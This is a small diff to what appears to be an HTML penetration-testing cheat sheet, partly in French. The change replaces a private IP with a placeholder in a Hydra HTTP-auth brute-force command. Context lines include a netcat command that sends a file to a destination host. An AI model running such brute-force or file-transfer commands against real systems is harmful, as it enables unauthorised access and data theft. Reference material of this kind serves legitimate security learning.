@@ -28,7 +28,7 @@ nc -w 3 [destination] 1234 < out.file</br>
 
 Hydra:</br>
 http-auth bute force</br>
-hydra -L user.txt -P password.txt -t12 -f 172.16.3.14 http-get / -V</br>
+hydra -L user.txt -P password.txt -t12 -f x.x.x.x http-get / -V</br>
 
 <h2>Windows</h2>
 systeminfo pour obtenir des renseignements sur le systeme</br>
